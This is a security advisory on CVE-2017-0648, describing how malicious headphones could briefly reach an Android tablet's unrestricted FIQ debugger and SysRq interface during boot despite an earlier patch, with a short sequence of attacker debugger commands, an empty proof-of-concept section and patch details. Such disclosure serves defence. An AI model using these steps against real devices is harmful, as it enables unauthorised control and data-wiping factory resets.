severity: high
alephid: ALEPH-2017014
date: '2017-06-13'
cve: CVE-2017-0648
---
Due to insufficient [patching](https://android.googlesource.com/kernel/tegra/+/a075f8ab69f679f221f9e2001363aae83cbdd2e8) of @CVE-2017-0510, malicious headphones could gain ephemeral access to the unrestricted FIQ Debugger and also issue `SysRq` commands. 
Such access, not blocked by @CVE-2017-0510's patch, was possible for a very short window of time during boot. Since the attacker could force a reboot even from the limited FIQ, he could access the capable FIQ even if the victim inserted the malicious cable after the platform had been fully loaded. Having ephemeral access to the unrestricted FIQ debugger is enough for the attacker to reboot into HBOOT (which can enable additional attacks), conduct factory resets, and more. 
```
Ephemeral Access to Unrestricted FIQ and SysRq (CVE-2017-0648)

                                                     `---------------'
Transitions:   
(1) sysrq_enabled = SYSRQ_DEFAULT_ENABLE = 1
(2) init: write 0 /proc/sys/kernel/sysrq 0 => sysrq_enabled = 0
(3) attacker @ limited FIQ:      'reboot'
(4) attacker @ unrestricted FIQ: 'reboot oem-42'
(5) attacker @ unrestricted FIQ: 'reboot oem-76'
```

It should be noted that **non-ephemeral** unrestricted FIQ and SysRq access was also possible while the device was in the recovery mode, however, it is less interesting due to reduced likelihood of victims having malicious headphones connected while their device is in recovery mode.

## Proof-of-Concept ##

The following demonstrates how we preempt an arbitrary process, and also get into the HBOOT mode, bypassing @CVE-2017-0510's patch. We assume the attack begins when the platform is fully-loaded. We force a (normal reboot), and then get an early and ephemeral access to the FIQ debugger, during which we issue the capable-FIQ `bt` command, and then reboot into HBOOT by issuing `reboot oem-42`:

## Patch ##

Google has patched the vulnerability by commit [34597d088801](https://android.googlesource.com/kernel/tegra/+/34597d088801ad8060b45026df2435f52136032f), available in the [N9F27C June 2017 build](https://developers.google.com/android/images#volantis).
The value of `SYSRQ_DEFAULT_ENABLE` is now 0, preventing access to the unrestricted FIQ debugger and `SysRq` interface since the kernel begins its execution:
